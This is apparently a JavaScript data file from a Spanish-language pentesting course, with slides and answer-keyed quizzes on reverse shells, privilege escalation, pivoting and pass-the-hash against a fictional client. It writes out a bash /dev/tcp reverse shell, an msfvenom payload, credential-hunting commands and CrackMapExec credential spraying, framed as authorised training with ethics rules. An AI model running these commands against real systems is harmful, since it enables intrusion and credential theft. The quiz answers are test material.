            tag: "SHELLS",
            titulo: "Tipos de shells",
            contenido: `Para trabajar cÃ³modamente en lugar de ejecutar comandos sueltos, necesitas una shell â€” una lÃ­nea de comandos que corre en el servidor y tÃº controlas desde tu mÃ¡quina.

REVERSE SHELL â€” el servidor se conecta hacia ti.
Es la mÃ¡s comÃºn en trabajo externo porque muchas redes bloquean conexiones entrantes hacia los servidores, pero permiten que los servidores salgan a internet.

TÃº te pones a escuchar en tu mÃ¡quina:
nc -lnvp 4444

Y envÃ­as este payload al servidor vulnerable:
bash -i >& /dev/tcp/TU_IP/4444 0>&1

El servidor ejecuta bash, conecta su entrada/salida hacia tu IP y puerto. TÃº ves la shell del servidor en tu terminal.

BIND SHELL â€” el servidor abre un puerto y tÃº te conectas.
Menos comÃºn porque los firewalls suelen bloquear conexiones entrantes.

WEB SHELL â€” un archivo (PHP, ASPX) que subes al servidor y accedes por el navegador.
Menos cÃ³modo pero a veces lo Ãºnico disponible.

GeneraciÃ³n de payloads con msfvenom:
msfvenom -p linux/x64/shell_reverse_tcp LHOST=TU_IP LPORT=4444 -f elf -o shell.elf`
          },
          {
            tag: "RESPONSABILIDAD",
            titulo: "Trabajar con responsabilidad profesional",
            contenido: `Tener acceso no es el final. Es donde el trabajo profesional empieza de verdad.

Tu trabajo no es demostrar cuÃ¡nto puedes romper. Tu trabajo es demostrar el riesgo de forma controlada para que el cliente pueda arreglarlo.

Reglas mientras estÃ¡s dentro del sistema:

â€” No toques archivos de configuraciÃ³n de producciÃ³n
â€” No leas datos reales de clientes (tarjetas, emails, contraseÃ±as)
â€” No instales nada que persista despuÃ©s del pentest
â€” Documenta cada comando ejecutado con su hora exacta

Estabilizar la shell (para trabajar sin que se corte):
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
(Ctrl+Z)
stty raw -echo; fg

Esto convierte una shell bÃ¡sica en una terminal usable con historial, autocompletado y Ctrl+C que no mata la sesiÃ³n.

Recuerda: estÃ¡s en el servidor de producciÃ³n de un cliente real. Cada acciÃ³n tiene consecuencias. Si algo se cae por tu intervenciÃ³n, es tu responsabilidad.`
          },
        ],
        quiz: [
          {
            q: "Confirmas RCE en la web principal del cliente. El servidor responde a 'id' con 'uid=33(www-data)'. Â¿Es suficiente para el informe?",
            opts: ["No, siempre debes escalar a root para demostrar impacto real", "SÃ­, 'id' demuestra ejecuciÃ³n remota de cÃ³digo â€” es evidencia sÃ³lida. Solo escalarÃ­as si el cliente lo pide y el alcance lo permite", "No, debes mostrar que puedes acceder a la base de datos", "SÃ­, pero solo si el cliente solicitÃ³ especÃ­ficamente RCE como objetivo"],
            c: 1,
            e: "Un comando inofensivo como 'id' o 'whoami' demuestra sin ambigÃ¼edad que el servidor ejecuta tus comandos. Ir mÃ¡s allÃ¡ sin necesidad aumenta el riesgo de afectar la operaciÃ³n. El impacto estÃ¡ demostrado â€” es suficiente evidencia."
          },
          {
            q: "Â¿Por quÃ© se prefiere una reverse shell en pentesting externo?",
            opts: ["Porque es mÃ¡s difÃ­cil de detectar por los antivirus", "Porque el servidor sale a conectarse hacia ti â€” evita los firewalls que bloquean conexiones entrantes hacia los servidores", "Porque es el Ãºnico tipo de shell que funciona en Linux", "Porque no requiere ejecutar cÃ³digo en el servidor"],
            c: 1,
            e: "Los firewalls corporativos tÃ­picamente permiten que los servidores hagan conexiones salientes (necesario para actualizaciones, APIs externas). Una reverse shell aprovecha eso: el servidor sale a buscarte en lugar de que tÃº entres al servidor."
          },
          {
            q: "Mientras estÃ¡s dentro del servidor del cliente, encuentras un archivo con datos de tarjetas de crÃ©dito de clientes reales. Â¿QuÃ© haces?",
            opts: ["Lo descargo como evidencia del hallazgo", "Cierro el archivo inmediatamente, anoto que existe con su ruta y hora, y reporto el hallazgo al cliente sin leer ni copiar los datos", "Lo leo para confirmar que son datos reales antes de reportar", "Lo ignoro porque no es parte del objetivo del pentest"],
            c: 1,
            e: "Acceder a datos reales de clientes sin necesidad es una violaciÃ³n Ã©tica y legal. El hallazgo es que el archivo existe y es accesible â€” eso ya es crÃ­tico. No necesitas leer los datos para probarlo. Documentas la existencia y reportas inmediatamente."
          },
          {
            q: "Â¿Para quÃ© sirve el comando 'python3 -c import pty;pty.spawn(\"/bin/bash\")' despuÃ©s de obtener una reverse shell?",
            opts: ["Para escalar privilegios a root automÃ¡ticamente", "Para convertir la shell bÃ¡sica en una terminal funcional con historial, autocompletado y comportamiento normal", "Para cifrar la comunicaciÃ³n con el servidor", "Para ejecutar Python en el servidor vÃ­ctima"],
            c: 1,
            e: "Una reverse shell bÃ¡sica es inestable: Ctrl+C mata la sesiÃ³n, no hay autocompletado y algunos programas no funcionan sin TTY. El comando spawna una bash con terminal real (PTY) que permite trabajar normalmente."
          },
          {
            q: "El cliente te dice que no profundices mÃ¡s en una vulnerabilidad que encontraste. Â¿CÃ³mo reaccionas?",
            opts: ["ContinÃºo de todas formas para demostrar el mÃ¡ximo impacto posible", "Acepto, documento el hallazgo con fecha y hora, y continÃºo con el resto del scope", "Pregunto al lÃ­der de proyecto si puedo ignorar la instrucciÃ³n del cliente", "Escalo la vulnerabilidad brevemente antes de detenerme"],
            c: 1,
            e: "Las instrucciones del cliente durante el proyecto son vinculantes. El cliente conoce sus sistemas: puede saber que seguir podrÃ­a derribar un servicio crÃ­tico o exponer datos que no deben verse. Documentas y continÃºas con otros objetivos."
          },
        ]
      },
    ]
  },

  {
    id: "rt-4",
    nombre: "Escalada de Privilegios",
    icon: "ðŸš€",
    color: "#a855f7",
    tag: "FREE",
    descripcion: "Pasas de www-data a root en Linux, de usuario normal a SYSTEM en Windows. Con mÃ©todo, no con suerte.",
    lecciones: [
      {
        id: "rt-4-1",
        titulo: "Linux â€” De www-data a root",
        slides: [
          {
            tag: "CONTEXTO",
            titulo: "Antes de atacar, ubÃ­cate",
            contenido: `EstÃ¡s dentro del servidor de Lumina Athletics como www-data. Es una cuenta muy limitada â€” la que usa el servidor web. No puedes leer archivos sensibles del sistema, no puedes cambiar configuraciones importantes.

Root es la cuenta que puede hacer absolutamente todo en Linux. Archivos, configuraciones, usuarios, servicios.

Pero antes de lanzarte a escalar, una pregunta honesta:

Â¿Ser root en este servidor cambia el impacto del hallazgo? Â¿O el valor real estÃ¡ en otra cosa â€” credenciales en un archivo de configuraciÃ³n, acceso a una red interna, datos de clientes?

Si ya tienes www-data y puedes acceder a la base de datos de la tienda, eso puede valer mÃ¡s en el informe que ser root en ese servidor.

Si la escalada sÃ­ aporta valor, empieza asÃ­:
id â†’ quiÃ©n eres y quÃ© grupos tienes
hostname â†’ en quÃ© equipo estÃ¡s
uname -a â†’ versiÃ³n del kernel (versiones viejas tienen CVEs)

Estos tres comandos son siempre los primeros. Anotas todo con hora.`
          },
          {
            tag: "VECTORES",
            titulo: "Sudo, SUID y credenciales",
            contenido: `Los vectores mÃ¡s efectivos en escalada Linux, en orden de probabilidad:

1. SUDO â€” Â¿quÃ© puedes ejecutar con privilegios de otro usuario?
sudo -l
Si puedes ejecutar algÃºn programa como root, GTFOBins (gtfobins.github.io) explica cÃ³mo cada programa puede explotarse para obtener shell o leer archivos.

2. SUID â€” programas que siempre se ejecutan como su dueÃ±o (root):
find / -perm -4000 -type f 2>/dev/null
Buscas programas raros, en rutas extraÃ±as, que no deberÃ­an tener SUID.

3. CREDENCIALES EN ARCHIVOS:
cat /var/www/html/.env
cat ~/.bash_history
find / -name "*.conf" -readable 2>/dev/null | xargs grep -l "password"
Los desarrolladores dejan credenciales escritas. El historial de bash guarda comandos con contraseÃ±as que alguien pegÃ³.

4. CRON â€” tareas programadas como root:
cat /etc/crontab
Si una tarea corre como root y ejecuta un script que tÃº puedes modificar â†’ puedes ejecutar cÃ³digo como root.

Herramienta automatizada: linpeas (github.com/peass-ng/PEASS-ng) â€” busca todo esto de una vez.`
          },
          {
            tag: "CREDENCIALES",
            titulo: "El hallazgo que vale mÃ¡s que root",
            contenido: `Mientras revisas el servidor de Drupal encuentras /var/www/html/.env:

DB_HOST=corp.local
DB_USER=drupal_app
DB_PASSWORD=S3cureDBp4ss!
DB_NAME=drupal_prod

Detente. Esto es mÃ¡s importante que cualquier escalada local.

DB_HOST=corp.local â†’ ese nombre interno (.local) indica que hay una red interna del cliente que tÃº, desde afuera, no podÃ­as ver. Ese servidor estÃ¡ conectado a ella.

La contraseÃ±a que encontraste puede estar reutilizada en:
â€” El servidor de base de datos directamente
â€” Otros servicios de la red interna
â€” La cuenta de algÃºn empleado
â€” El panel de administraciÃ³n de otro sistema

Este es el momento de parar y comunicar.

1. Anotas la credencial con fecha y hora
2. Avisas al cliente que encontraste acceso potencial a la red interna
3. Preguntas si puedes probarla contra otros sistemas del scope
4. Solo si tienes autorizaciÃ³n explÃ­cita, continÃºas

Una credencial que abre la red interna es un hallazgo que cambia el informe entero.`
          },
        ],
        quiz: [
          {
            q: "sudo -l muestra que puedes ejecutar /usr/bin/vim como root. Â¿QuÃ© puedes hacer con esto?",
            opts: ["Editar archivos de sistema pero sin obtener una shell", "SegÃºn GTFOBins, vim puede lanzar una shell como root desde su modo de comando â€” es un vector de escalada clÃ¡sico", "Solo ver archivos de configuraciÃ³n como root", "Nada, vim es solo un editor de texto"],
            c: 1,
            e: "GTFOBins documenta que vim con sudo puede ejecutar ':!/bin/bash' para obtener una shell root. Muchos programas aparentemente inocentes tienen capacidades no obvias cuando corren con privilegios elevados."
          },
          {
            q: "find / -perm -4000 -type f 2>/dev/null devuelve /usr/local/bin/backup_tool con SUID y propietario root. Â¿Por quÃ© es interesante?",
            opts: ["Los archivos SUID siempre son seguros si el propietario es root", "Es un programa no estÃ¡ndar en una ruta no estÃ¡ndar con SUID de root â€” merece investigaciÃ³n para ver si puede abusar de su ejecuciÃ³n privilegiada", "SUID solo afecta a binarios del sistema operativo", "Solo es relevante si el binario tiene vulnerabilidades conocidas en CVE"],
            c: 1,
            e: "Los programas SUID estÃ¡ndar del sistema son esperados. Uno personalizado en /usr/local/bin es sospechoso â€” puede tener un path traversal, inyecciÃ³n de comandos o simplemente lanzar una shell. GTFOBins primero, anÃ¡lisis manual despuÃ©s."
          },
          {
            q: "En .env encuentras DB_HOST=corp.local. Â¿Por quÃ© es mÃ¡s valioso que simplemente tener la contraseÃ±a de la base de datos?",
            opts: ["Porque corp.local siempre tiene vulnerabilidades crÃ­ticas", "Porque revela que existe una red interna (.local) que el servidor puede alcanzar â€” potencial pivoting a sistemas no visibles desde internet", "Porque .local indica que el servidor estÃ¡ desactualizado", "Solo es relevante si tienes credenciales de admin del dominio"],
            c: 1,
            e: "corp.local es un nombre DNS interno, no resoluble desde internet. Su presencia confirma que el servidor comprometido estÃ¡ dentro de la red interna del cliente. Desde ese servidor puedes alcanzar sistemas que normalmente no son atacables externamente."
          },
          {
            q: "Linpeas marca decenas de vectores potenciales en colores. Â¿CuÃ¡l es el enfoque correcto?",
            opts: ["Explotar todos los vectores rojos (crÃ­ticos) antes de continuar", "Leer con criterio, priorizar los que tienen mÃ¡s probabilidad de funcionar y son menos invasivos, descartar lo que no confirmas rÃ¡pido", "Explotar en el orden que linpeas los lista", "Ignorar linpeas y hacer la escalada manualmente siempre"],
            c: 1,
            e: "Linpeas es una herramienta, no un orÃ¡culo. Marca cosas que requieren interpretaciÃ³n. Algunos 'vectores' son configuraciones normales. Priorizar por impacto y probabilidad es parte del juicio profesional â€” no todo lo que linpeas marca es explotable."
          },
          {
            q: "Llevas 2 horas intentando escalar privilegios en el servidor sin resultado. Â¿CuÃ¡l es la decisiÃ³n correcta?",
            opts: ["Continuar hasta encontrar algo â€” la persistencia es la clave del pentesting", "Documentar los intentos, descartar este vector por ahora y pasar al siguiente objetivo del scope", "Pedir al cliente mÃ¡s tiempo exclusivamente para este servidor", "Intentar pruebas mÃ¡s agresivas aunque el cliente pidiÃ³ que no fueran invasivas"],
            c: 1,
            e: "En consultorÃ­a el tiempo es real y los recursos son limitados. Si un vector no da seÃ±al despuÃ©s de un tiempo razonable, lo documentas y priorizas otros objetivos. Hay 5 objetivos mÃ¡s en el scope. El tiempo mal gastado aquÃ­ es tiempo que no inviertes en otros hallazgos."
          },
        ]
      },
    ]
  },,

// MÃ³dulos adicionales para agregar al array REDTEAM_MODULOS en redteam.js

  {
    id: "rt-5",
    nombre: "Post-ExplotaciÃ³n y Movimiento Lateral",
    icon: "ðŸ•µï¸",
    color: "#00d4ff",
    tag: "FREE",
    descripcion: "Dentro del sistema, mapeas la red interna, te mueves hacia otros objetivos y entiendes el alcance real del compromiso.",
    lecciones: [
      {
        id: "rt-5-1",
        titulo: "Reconocimiento interno",
        slides: [
          {
            tag: "POST-EXPLOTACION",
            titulo: "Primer contacto con la red interna",
            contenido: `Entraste como www-data en el servidor web de Lumina Athletics. Antes de moverte, entiendes exactamente dÃ³nde estÃ¡s y quÃ© hay alrededor.

Comandos de orientaciÃ³n inicial:

id
hostname
uname -a
ip addr
ip route
cat /etc/hosts
cat /etc/resolv.conf

ip addr te muestra todas las interfaces de red. Si hay mÃ¡s de una, el servidor estÃ¡ conectado a mÃºltiples redes â€” lo que significa que puedes alcanzar segmentos que desde internet no son visibles.

ip route muestra la tabla de enrutamiento â€” a quÃ© redes puede llegar este servidor.

/etc/hosts puede tener nombres internos de otros servidores que el administrador aÃ±adiÃ³ manualmente. Cada entrada es un objetivo potencial.

/etc/resolv.conf revela el servidor DNS interno. Ese servidor DNS probablemente puede resolver nombres de mÃ¡quinas internas que desde internet no existen.

Anota todo con fecha y hora. EstÃ¡s mapeando territorio desconocido.`
          },
          {
            tag: "ENUMERACION INTERNA",
            titulo: "Descubrir hosts en la red interna",
            contenido: `El servidor comprometido tiene IP 10.0.0.15. Su tabla de rutas muestra la red 10.0.0.0/24.

Hay hasta 254 hosts posibles en esa red. Â¿CuÃ¡les estÃ¡n activos?

Ping sweep bÃ¡sico (bash):
for i in $(seq 1 254); do ping -c1 -W1 10.0.0.$i &>/dev/null && echo "10.0.0.$i activo"; done

Es lento pero funciona sin herramientas externas.

Con nmap (si estÃ¡ instalado o si puedes subirlo):
nmap -sn 10.0.0.0/24

-sn es ping scan â€” no escanea puertos, solo descubre hosts activos. MÃ¡s rÃ¡pido.

Resultados tÃ­picos en una red corporativa pequeÃ±a:
10.0.0.1  â†’ router/gateway
10.0.0.5  â†’ servidor de base de datos
10.0.0.10 â†’ controlador de dominio Windows
10.0.0.15 â†’ tÃº (servidor web comprometido)
10.0.0.20 â†’ servidor de archivos

Cada host descubierto es un nuevo objetivo potencial. El controlador de dominio es el prize â€” quien lo controla controla toda la organizaciÃ³n.

Anota cada host descubierto con su IP y cualquier nombre que puedas resolver.`
          },
          {
            tag: "SERVICIOS INTERNOS",
            titulo: "QuÃ© corre en la red interna",
            contenido: `Con los hosts descubiertos, ahora miras quÃ© servicios exponen internamente.

Desde el servidor comprometido:
nmap -sV 10.0.0.5
nmap -sV 10.0.0.10

Hallazgos tÃ­picos:

10.0.0.5 (DB server):
3306/tcp  open  mysql  MySQL 5.7.39
5432/tcp  open  postgresql

10.0.0.10 (Domain Controller):
53/tcp    open  domain  (DNS)
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds (SMB)
3389/tcp  open  ms-wbt-server (RDP)

El puerto 88 (Kerberos) confirma que 10.0.0.10 es el Domain Controller de Active Directory.

El puerto 3306 en el servidor de DB sin autenticaciÃ³n externa â€” ahora desde adentro puedes intentar conectarte directamente con las credenciales del .env que encontraste antes:

mysql -h 10.0.0.5 -u drupal_app -p

Si funciona, tienes acceso directo a la base de datos de producciÃ³n.`
          },
          {
            tag: "CREDENCIALES",
            titulo: "ReutilizaciÃ³n de credenciales",
            contenido: `Ya tienes la credencial del .env:
DB_USER=drupal_app
DB_PASSWORD=S3cureDBp4ss!

Antes de intentar explotar servicios, pruebas si esta contraseÃ±a se reutilizÃ³ en otros sistemas. La reutilizaciÃ³n de contraseÃ±as en entornos corporativos es extremadamente comÃºn.

Prueba SSH con las credenciales encontradas:
ssh drupal_app@10.0.0.5
ssh drupal_app@10.0.0.10

Prueba con variaciones comunes del usuario:
- El username del sistema puede ser diferente al de la DB
- Intenta: admin, administrator, root, waldo (nombre de empleado si lo encontraste en OSINT)

Si encuentras un archivo wp-config.php, settings.php u otro archivo de configuraciÃ³n:
find / -name "*.php" -readable 2>/dev/null | xargs grep -l "password" 2>/dev/null

Cada contraseÃ±a encontrada se prueba en todos los servicios descubiertos.

Una sola contraseÃ±a reutilizada puede darte acceso a mÃºltiples sistemas. Esto se llama credential stuffing interno â€” y es devastadoramente efectivo en redes corporativas reales.`
          },
        ],
        quiz: [
          {
            q: "Â¿Por quÃ© revisar /etc/hosts en el servidor comprometido?",
            opts: ["Para ver la contraseÃ±a del administrador del servidor", "Puede contener nombres y IPs de servidores internos que el administrador aÃ±adiÃ³ manualmente â€” objetivos potenciales no visibles desde internet", "Para confirmar que el servidor tiene conexiÃ³n a internet", "Para ver quÃ© usuarios tienen acceso SSH al servidor"],
            c: 1,
            e: "/etc/hosts contiene mapeos manuales de hostname a IP. Los administradores frecuentemente aÃ±aden entradas para servidores internos como db.corp.local, dc01.corp.local, que no son accesibles desde internet pero sÃ­ desde la red interna."
          },
          {
            q: "El servidor comprometido tiene dos interfaces: eth0 (192.168.1.15, internet) y eth1 (10.0.0.15, red interna). Â¿QuÃ© significa esto?",
            opts: ["Solo que el servidor tiene redundancia de red", "El servidor es un pivot â€” conecta la red pÃºblica con la red interna. Desde Ã©l puedes alcanzar sistemas de la red 10.0.0.0/24 que normalmente no son accesibles desde internet", "Que el servidor tiene el doble de velocidad de red", "Solo importa si la red interna tiene mÃ¡s hosts que la externa"],
            c: 1,
            e: "Un servidor con dos interfaces en redes diferentes actÃºa como puente (pivot). Desde ese servidor comprometido puedes alcanzar toda la red interna 10.0.0.0/24 â€” incluido el Domain Controller, servidores de base de datos y cualquier otro sistema interno."
          },
          {
            q: "Encuentras el puerto 88 (Kerberos) abierto en 10.0.0.10. Â¿QuÃ© confirma esto?",
            opts: ["Que el servidor usa autenticaciÃ³n de dos factores", "Que 10.0.0.10 es el Domain Controller de Active Directory â€” el objetivo mÃ¡s valioso de la red interna", "Que el servidor tiene un firewall activo", "Que el servidor es un servidor de correo Microsoft Exchange"],
            c: 1,
            e: "El puerto 88 (Kerberos) junto con el 389 (LDAP) y 445 (SMB) son la firma de un Domain Controller de Active Directory. El DC es el objetivo mÃ¡s valioso en una red Windows â€” quien lo controla tiene acceso a todos los sistemas del dominio."
          },
          {
            q: "Tienes la credencial DB_PASSWORD=S3cureDBp4ss! del .env. Â¿Por quÃ© probarla en SSH y otros servicios ademÃ¡s de la base de datos?",
            opts: ["Por protocolo â€” siempre se prueba en todos los servicios", "La reutilizaciÃ³n de contraseÃ±as en entornos corporativos es extremadamente comÃºn â€” la misma contraseÃ±a puede funcionar en mÃºltiples sistemas y cuentas", "Porque MySQL y SSH usan las mismas credenciales por defecto", "Solo tiene sentido si el username tambiÃ©n es el mismo"],
            c: 1,
            e: "Estudios muestran que mÃ¡s del 60% de las organizaciones tienen problemas de reutilizaciÃ³n de contraseÃ±as. Una contraseÃ±a encontrada en un sistema frecuentemente funciona en otros. Es uno de los vectores de movimiento lateral mÃ¡s efectivos y mÃ¡s comunes en pentesting real."
          },
          {
            q: "Â¿CuÃ¡l es la diferencia entre reconocimiento externo y reconocimiento interno?",
            opts: ["No hay diferencia prÃ¡ctica â€” las mismas herramientas y tÃ©cnicas", "Externo: desde internet sin acceso al sistema. Interno: desde dentro de la red, con acceso a sistemas no visibles desde internet, mÃ¡s informaciÃ³n de red y posibilidad de alcanzar infraestructura crÃ­tica", "Interno es siempre mÃ¡s sigiloso que externo", "Externo usa nmap, interno usa solo comandos nativos del sistema"],
            c: 1,
            e: "El reconocimiento interno es cualitativamente diferente: tienes acceso a la red interna completa, puedes ver servidores que no tienen exposiciÃ³n a internet, puedes escuchar trÃ¡fico de red local, y los firewalls internos suelen ser mucho mÃ¡s permisivos que los externos."
          },
        ]
      },
      {
        id: "rt-5-2",
        titulo: "Pivoting y Movimiento Lateral",
        slides: [
          {
            tag: "PIVOTING",
            titulo: "Usar el servidor comprometido como puente",
            contenido: `Pivoting es usar un sistema comprometido para llegar a otros sistemas que no son directamente accesibles.

Tu mÃ¡quina atacante estÃ¡ en internet. Los servidores internos (10.0.0.x) no son accesibles desde internet. Pero el servidor web comprometido estÃ¡ en ambas redes.

TÃ‰CNICA 1: Port Forwarding con SSH

Si tienes credenciales SSH en el servidor comprometido:
ssh -L 3306:10.0.0.5:3306 www-data@victima.com

Esto crea un tÃºnel: tu localhost:3306 se reenvÃ­a a travÃ©s del servidor comprometido hacia 10.0.0.5:3306

Ahora desde tu mÃ¡quina:
mysql -h 127.0.0.1 -P 3306 -u drupal_app -p

EstÃ¡s conectando a la base de datos interna como si estuvieras dentro de la red.

TÃ‰CNICA 2: Dynamic Port Forwarding (SOCKS proxy)

ssh -D 9050 www-data@victima.com

Crea un proxy SOCKS en tu localhost:9050. Todo el trÃ¡fico que envÃ­es por ese proxy sale desde el servidor comprometido.

Configurar proxychains para usar ese proxy:
proxychains nmap -sT 10.0.0.10

Ahora nmap escanea el Domain Controller desde dentro de la red interna, a travÃ©s del servidor comprometido.`
          },
          {
            tag: "MOVIMIENTO LATERAL",
            titulo: "Pass the Hash y reutilizaciÃ³n de credenciales",
            contenido: `Movimiento lateral es comprometer un sistema para llegar a otro dentro de la misma red.

REUTILIZACIÃ“N DE CREDENCIALES:
Ya probamos esto. Una credencial encontrada se prueba en todos los servicios.

PASS THE HASH (Windows):
En Windows, muchos protocolos de autenticaciÃ³n aceptan el hash NTLM directamente sin necesidad de conocer la contraseÃ±a en texto plano.

Si obtienes el hash NTLM de un usuario:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c

Puedes autenticarte en otros sistemas Windows con ese hash, sin crackearlo:
impacket-psexec -hashes :8846f7eaee8fb117ad06bdd830b7586c Administrator@10.0.0.20

Si el mismo usuario Administrator tiene la misma contraseÃ±a (mismo hash) en mÃºltiples mÃ¡quinas Windows â€” que es extremadamente comÃºn en entornos mal configurados â€” un solo hash te da acceso a toda la red.

HERRAMIENTAS DE MOVIMIENTO LATERAL:
impacket-psexec â†’ ejecutar comandos remotos via SMB
impacket-wmiexec â†’ ejecutar via WMI (mÃ¡s sigiloso)
crackmapexec â†’ probar credenciales/hashes en mÃºltiples hosts simultÃ¡neamente`
          },
          {
            tag: "HERRAMIENTA",
            titulo: "CrackMapExec â€” automatizar el movimiento lateral",
            contenido: `CrackMapExec (CME) automatiza la prueba de credenciales y hashes en mÃºltiples sistemas Windows simultÃ¡neamente.

Probar una credencial en toda la red:
crackmapexec smb 10.0.0.0/24 -u Administrator -p 'S3cureDBp4ss!'

Probar un hash NTLM:
crackmapexec smb 10.0.0.0/24 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c

Resultado verde con [+] = autenticaciÃ³n exitosa
Resultado con (Pwn3d!) = tienes acceso de administrador local

crackmapexec smb 10.0.0.0/24 -u Administrator -p 'Password123' --shares

--shares lista los recursos compartidos accesibles â€” archivos, backups, datos sensibles.

Ejecutar comandos en todos los sistemas donde autenticaste:
crackmapexec smb 10.0.0.0/24 -u Administrator -p 'Password123' -x "whoami"

Una sola credencial de administrador local + reutilizaciÃ³n de contraseÃ±as = acceso masivo a la red.

En el informe esto se documenta como: "Credencial encontrada en servidor web permitiÃ³ autenticaciÃ³n en X sistemas adicionales â€” impacto: compromiso de la red interna completa."`
          },
        ],
        quiz: [
          {
            q: "Â¿QuÃ© es pivoting en un contexto de pentesting?",
            opts: ["Cambiar de herramienta durante el escaneo", "Usar un sistema comprometido como puente para alcanzar otros sistemas en redes que no son directamente accesibles", "Rotar entre diferentes cuentas comprometidas", "Cambiar la IP de tu mÃ¡quina atacante"],
            c: 1,
            e: "Pivoting permite alcanzar segmentos de red internos a travÃ©s de sistemas ya comprometidos. El servidor web comprometido actÃºa como punto de entrada a la red interna que normalmente no es accesible desde internet."
          },
          {
            q: "ssh -D 9050 user@servidor crea un proxy SOCKS. Â¿Para quÃ© sirve combinado con proxychains?",
            opts: ["Para cifrar el trÃ¡fico entre tu mÃ¡quina y el servidor", "Para enrutar el trÃ¡fico de herramientas como nmap a travÃ©s del servidor comprometido, haciÃ©ndolo aparecer como si viniera de dentro de la red interna", "Para crear mÃºltiples sesiones SSH simultÃ¡neas", "Para acelerar el escaneo de red"],
            c: 1,
            e: "El proxy SOCKS dinÃ¡mico convierte el servidor comprometido en un router. proxychains redirige el trÃ¡fico de cualquier herramienta por ese proxy. El resultado: nmap o cualquier herramienta escanea la red interna como si estuviera fÃ­sicamente dentro de ella."
          },
          {
            q: "Â¿QuÃ© es Pass the Hash y por quÃ© es efectivo en redes Windows?",
            opts: ["Pasar un diccionario de contraseÃ±as entre herramientas", "Autenticarse en sistemas Windows usando el hash NTLM directamente sin conocer la contraseÃ±a en texto plano â€” funciona porque muchos protocolos Windows aceptan el hash como autenticaciÃ³n vÃ¡lida", "Un ataque que funciona solo contra contraseÃ±as dÃ©biles", "Una tÃ©cnica para descifrar hashes NTLM"],
            c: 1,
            e: "Windows NT LAN Manager acepta el hash como prueba de autenticaciÃ³n. Si obtienes el hash de Administrator de una mÃ¡quina y ese hash es el mismo en otras (contraseÃ±a reutilizada), puedes autenticarte en todas sin conocer la contraseÃ±a original."
          },
          {
            q: "CrackMapExec devuelve '(Pwn3d!)' para varios hosts. Â¿QuÃ© significa?",
            opts: ["Que los hosts estÃ¡n caÃ­dos y no responden", "Que tienes acceso de administrador local en esos sistemas â€” puedes ejecutar comandos remotamente", "Que las credenciales son incorrectas", "Que los sistemas tienen el firewall activo"],
            c: 1,
            e: "(Pwn3d!) en CME indica que la credencial funciona Y tienes privilegios de administrador local, lo que permite ejecuciÃ³n remota de comandos via SMB. Es el resultado que buscas al hacer movimiento lateral."
          },
          {
            q: "Â¿CÃ³mo documentas el movimiento lateral en el informe para el cliente?",
            opts: ["No se documenta para no alarmar al cliente", "DescripciÃ³n tÃ©cnica del vector (credencial reutilizada), sistemas afectados, comandos exactos ejecutados con timestamps, y el impacto real: cuÃ¡ntos sistemas fueron comprometidos a partir de un solo punto de entrada", "Solo se menciona como nota al pie del informe", "Se omite si el cliente no pidiÃ³ explÃ­citamente pruebas de movimiento lateral"],
            c: 1,
            e: "El movimiento lateral es uno de los hallazgos mÃ¡s importantes en un pentest â€” demuestra el impacto en cascada de una sola vulnerabilidad. El cliente necesita entender que comprometer un servidor web puede llevar al compromiso de toda su red interna."
          },
        ]
      },
    ]
  },

  {
    id: "rt-6",
    nombre: "Escalada de Privilegios en Windows",
    icon: "ðŸªŸ",
    color: "#00d4ff",
    tag: "FREE",
    descripcion: "De usuario normal a SYSTEM en entornos Windows corporativos. Servicios, tokens, registros y tÃ©cnicas reales.",
    lecciones: [
      {
        id: "rt-6-1",
        titulo: "OrientaciÃ³n en Windows",
        slides: [
          {
            tag: "WINDOWS",
            titulo: "Diferencias clave respecto a Linux",
            contenido: `Entrar a un sistema Windows corporativo se siente diferente a Linux. La estructura es distinta, las herramientas son distintas y los vectores de escalada son distintos.

Comandos de orientaciÃ³n inicial en Windows:

whoami
whoami /priv
whoami /groups
net user
net localgroup administrators
systeminfo
ipconfig /all
netstat -ano

whoami /priv muestra los privilegios del token actual. Algunos privilegios pueden explotarse directamente para escalar a SYSTEM sin necesidad de otros vectores.

Privilegios interesantes:
SeImpersonatePrivilege â†’ explotable con Potato attacks (JuicyPotato, PrintSpoofer)
SeBackupPrivilege â†’ puede leer cualquier archivo del sistema
SeDebugPrivilege â†’ puede inyectar en cualquier proceso
SeRestorePrivilege â†’ puede escribir en cualquier archivo

systeminfo muestra la versiÃ³n exacta del sistema operativo y los hotfixes instalados. Con esa informaciÃ³n buscas CVEs de escalada de privilegios locales.

net localgroup administrators lista quiÃ©n tiene privilegios de administrador local â€” nombres de usuarios, grupos de dominio.`
          },
          {
            tag: "VECTORES",
            titulo: "Servicios mal configurados",
            contenido: `Los servicios de Windows son programas que corren en background con privilegios elevados. Un servicio mal configurado puede ejecutar cÃ³digo como SYSTEM.

PERMISOS DÃ‰BILES EN BINARIOS DE SERVICIO:
Si puedes modificar el ejecutable que un servicio corre como SYSTEM, al reiniciar el servicio ejecutas tu cÃ³digo con esos privilegios.

Verificar permisos de servicios:
Get-WmiObject -Class Win32_Service | Select-Object Name, PathName, StartMode, State
icacls "C:\Program Files\VulnerableService\service.exe"

Si icacls muestra que tu usuario puede escribir el archivo â†’ reemplazas el binario con uno malicioso y reinicias el servicio.

UNQUOTED SERVICE PATHS:
Cuando la ruta del ejecutable de un servicio tiene espacios y no estÃ¡ entre comillas, Windows prueba mÃºltiples ubicaciones.

Ejemplo de ruta vulnerable:
C:\Program Files\My Service\bin\service.exe

Windows prueba en orden:
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Service\bin\service.exe

Si puedes escribir en C:\Program Files\ â†’ creas My.exe â†’ se ejecuta como SYSTEM.

Buscar unquoted paths:
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

Cualquier resultado con espacios sin comillas es potencialmente explotable.`
          },
          {
            tag: "TOKENS",
            titulo: "Token Impersonation â€” Potato Attacks",
            contenido: `En Windows, cuando un servicio corre como SYSTEM y necesita autenticarse en la red, crea un token de autenticaciÃ³n. Si tienes SeImpersonatePrivilege, puedes robar ese token y usarlo para ejecutar cÃ³digo como SYSTEM.

SeImpersonatePrivilege es comÃºn en cuentas de servicio como:
IIS AppPool (servidor web IIS)
SQL Server service account
Network Service

PRINTSPOOFER â€” funciona en Windows 10/Server 2019+:
